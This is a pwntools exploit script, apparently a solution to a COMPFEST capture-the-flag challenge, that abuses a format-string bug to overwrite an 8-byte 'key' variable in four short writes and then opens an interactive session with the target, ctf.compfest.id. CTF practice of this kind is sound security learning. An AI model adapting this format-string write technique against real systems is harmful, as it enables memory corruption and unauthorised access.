#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
context.terminal = ['wt.exe','wsl.exe']


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('ctf.compfest.id',7001)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No

p = start()

addr_key = 0x4040b0
offset_fmt_str = 6

def execute_writes(payload):
    p.sendlineafter(b"Say something: ", payload)
    return p.recvuntil(b"Your voice echoed: ")

v6_full = (1804289383 << 32) | 0xDEADBEEF
log.info(f"Nilai v6 yang akan ditulis: {hex(v6_full)}")

log.info("Memulai penulisan 8 byte ke variabel 'key'...")
for i in range(4):
    target_addr = addr_key + (i * 2)
    value_to_write = (v6_full >> (i * 16)) & 0xffff
    
    log.info(f"Iterasi {i+1}: Menulis 0x{value_to_write:04x} ke {hex(target_addr)}")
    payload = fmtstr_payload(offset_fmt_str, {target_addr: value_to_write}, write_size='short')
    
    assert len(payload) < 80, f"Payload ke-{i+1} terlalu panjang! ({len(payload)} bytes)"
    
    p.sendlineafter(b"Say something: ", payload)
    p.recvuntil(b"Your voice echoed: ")
p.interactive()